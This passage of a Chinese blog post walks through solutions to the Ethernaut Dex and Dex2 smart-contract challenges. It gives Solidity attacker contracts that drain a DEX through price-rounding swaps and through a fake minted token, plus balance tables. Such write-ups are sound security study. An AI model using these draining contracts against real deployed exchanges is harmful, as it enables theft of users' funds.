+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">me</span> =&gt; contract amount<br><span class="hljs-attribute">contract</span> =&gt; me amount*to/from<br><br><br><span class="hljs-attribute">0</span>				token <span class="hljs-number">1</span>			token2<br><span class="hljs-attribute">me</span>				<span class="hljs-number">10</span>				<span class="hljs-number">10</span><br><span class="hljs-attribute">contract</span>		<span class="hljs-number">100</span>				<span class="hljs-number">100</span><br><br><span class="hljs-attribute">1</span>	<span class="hljs-number">1</span> =&gt; <span class="hljs-number">2</span><br><span class="hljs-attribute">me</span>				<span class="hljs-number">0</span>				<span class="hljs-number">20</span><br><span class="hljs-attribute">contract</span>		<span class="hljs-number">110</span>				<span class="hljs-number">90</span><br><br><span class="hljs-attribute">2</span>	<span class="hljs-number">2</span> =&gt; <span class="hljs-number">1</span><br><span class="hljs-attribute">me</span>				<span class="hljs-number">24</span>				<span class="hljs-number">0</span><br><span class="hljs-attribute">contract</span>		<span class="hljs-number">86</span>				<span class="hljs-number">110</span><br><br><span class="hljs-attribute">3</span>	<span class="hljs-number">1</span> =&gt; <span class="hljs-number">2</span><br><span class="hljs-attribute">me</span>				<span class="hljs-number">0</span>				<span class="hljs-number">30</span>			<br><span class="hljs-attribute">contract</span>		<span class="hljs-number">110</span>				<span class="hljs-number">80</span><br><br><span class="hljs-attribute">4</span> 	<span class="hljs-number">2</span> =&gt; <span class="hljs-number">1</span><br><span class="hljs-attribute">me</span>				<span class="hljs-number">41</span>				<span class="hljs-number">0</span><br><span class="hljs-attribute">contract</span>		<span class="hljs-number">69</span>   			<span class="hljs-number">110</span><br><br><span class="hljs-attribute">5</span>	<span class="hljs-number">1</span> =&gt; <span class="hljs-number">2</span><br><span class="hljs-attribute">me</span>				<span class="hljs-number">0</span>				<span class="hljs-number">65</span><br><span class="hljs-attribute">contract</span>		<span class="hljs-number">110</span>				<span class="hljs-number">45</span><br><br><span class="hljs-attribute">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="hljs-attribute">6</span>	<span class="hljs-number">2</span> =&gt; <span class="hljs-number">1</span><br><span class="hljs-attribute">me</span>				<span class="hljs-number">158</span>				<span class="hljs-number">0</span><br><span class="hljs-attribute">contract</span>		-??				<span class="hljs-number">110</span><br><span class="hljs-attribute">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><br><span class="hljs-attribute">6</span> 	<span class="hljs-number">2</span> =&gt; <span class="hljs-number">1</span><br><span class="hljs-attribute">me</span>				<span class="hljs-number">110</span>x / <span class="hljs-number">45</span>		<span class="hljs-number">65</span> - x<br><span class="hljs-attribute">contract</span>		<span class="hljs-number">110</span> - <span class="hljs-number">110</span>x / <span class="hljs-number">45</span>	<span class="hljs-number">45</span> + x<br><br><span class="hljs-attribute">x</span> = <span class="hljs-number">45</span><br></code></pre></td></tr></table></figure>
+<h3 id="实现-8"><a href="#实现-8" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface IDex &#123;    <br>    function token1() external view returns(address);<br>    function token2() external view returns(address);<br>    function swap(address from, address to, uint256 amount) external;<br>    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);<br>    function approve(address spender, uint256 amount) external;<br>    function balanceOf(address token, address account) external view returns (uint256);<br>&#125;<br><br>interface IERC20 &#123;<br>    function approve(address sender, uint256 amount) external;<br>    function transferFrom(address from, address to, uint256 amount) external;<br>    function balanceOf(address) external returns(uint256);<br>&#125;<br><br>contract psss &#123;<br>    IDex dex;<br>    IERC20 immutable token1;<br>    IERC20 immutable token2;<br><br>    constructor(IDex _dex) &#123;<br>        dex = _dex;<br>        token1 = IERC20( dex.token1() );<br>        token2 = IERC20( dex.token2() );<br>    &#125;<br><br>    function turnToZero() public &#123;<br>        // 把属于钱包的 token 转给合约，让它操作<br>        token1.transferFrom(msg.sender, address(this), 10);<br>        token2.transferFrom(msg.sender, address(this), 10);<br><br>        token1.approve(address(dex), 10000);<br>        token2.approve(address(dex), 10000);<br><br>        _swap(token1, token2);<br>        _swap(token2, token1);<br>        _swap(token1, token2);<br>        _swap(token2, token1);<br>        _swap(token1, token2);<br>        <br>        dex.swap(address(token2), address(token1), 45);<br><br>        assert(dex.balanceOf(address(token1), address(dex)) == 0);<br>    &#125;<br><br>    // 调用 dex 的 swap()，把本合约的 from 全部转为 to<br>    function _swap(IERC20 from, IERC20 to) internal &#123;<br>        dex.swap(address(from), address(to), from.balanceOf(address(this)));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>首先获取 <code>token1</code> 和 <code>token2</code> 的地址，分别都给我们的 <code>pass</code> 合约 <code>approve</code> 一点额度，然后再调用 <code>turnToZero()</code>，否则前两行会无法执行。</p>
+<h2 id="24-Dex2"><a href="#24-Dex2" class="headerlink" title="24. Dex2"></a>24. Dex2</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>与 <code>Dex</code> 对比，显然，交换时缺少了判断 <code>require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</code>，这意味着我们可以用自定义的 <code>ERC20</code> 代币作为 <code>from</code> 来进行交换。</p>
+<h3 id="实现-9"><a href="#实现-9" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br>import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol&quot;;<br>import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol&quot;;<br><br>interface IDex2 &#123;    <br>    function token1() external view returns(address);<br>    function token2() external view returns(address);<br>    function swap(address from, address to, uint256 amount) external;<br>    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);<br>    function approve(address spender, uint256 amount) external;<br>    function balanceOf(address token, address account) external view returns (uint256);<br>&#125;<br><br>contract customizedToken is ERC20&#123;<br><br>    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol)&#123;&#125;<br><br>    function mint(address who, uint256 amount) public &#123;<br>        _mint(who, amount);<br>    &#125;<br>&#125;<br><br>contract pass &#123;<br><br>    IDex2 private immutable dex2;<br>    customizedToken private immutable token;<br>    IERC20 private immutable token1;<br>    IERC20 private immutable token2;<br><br>    constructor(IDex2 _dex2, customizedToken _token, IERC20 _token1, IERC20 _token2) &#123;<br>        dex2 = _dex2;<br>        token = _token;<br>        token1 = _token1;<br>        token2 = _token2;<br>        owner = msg.sender;<br>    &#125;<br><br>    function turnToZero() public &#123;<br>        <br>        token.approve(address(dex2), 10000);<br>        token1.approve(address(dex2), 10000);<br>        token2.approve(address(dex2), 10000);<br>        <br>        token.mint(address(this), 10000);<br><br>        token.mint(address(dex2), 100);<br>        swap(token1, 100);<br>        swap(token2, 200);<br><br>        require( dex2.balanceOf(address(token1), address(dex2)) == 0, &quot;token1 is not zero&quot;);<br>        require( dex2.balanceOf(address(token2), address(dex2)) == 0, &quot;token2 is not zero&quot;);<br>    &#125;<br><br>    function swap(IERC20 to, uint256 amount) public &#123;<br>        dex2.swap(address(token), address(to), amount);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>分析一下。</p>
+<p>初始是这样的：<br>|      | token1 | token2 | token |<br>| :—: | :——: | :——: | :—-: |<br>| dex2 |  100   |  100   |  100  |<br>| pass |   0    |   0    | 10000 |</p>
+<p>第一次交换后：<br>|      | token1 | token2 | token |<br>| :—: | :——: | :——: | :—-: |<br>| dex2 |   0    |  100   |  200  |<br>| pass |  100   |   0    | 19800 |</p>
+<p>那么设这次交换的 <code>amount = x</code>，有 ${SwapPrice} = \frac {100x} {200} = 100$，因此第二次交换就是200个。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>The Ethernaut</div>
+      <div>http://example.com/2025/03/22/The Ethernaut/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Victifa</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月22日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/03/22/EVMopcodes/" title="EVMopcodes">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">EVMopcodes</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/01/12/ethers-js/" title="ethers.js">
+                        <span class="hidden-mobile">ethers.js</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"wHTYi0mKgiheGQgyxHkEi3nE-MdYXbMMI","appKey":"lkxJFZpLfQmmGvh5ogFI55hJ","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"https://whtyi0mk.api.lncldglobal.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
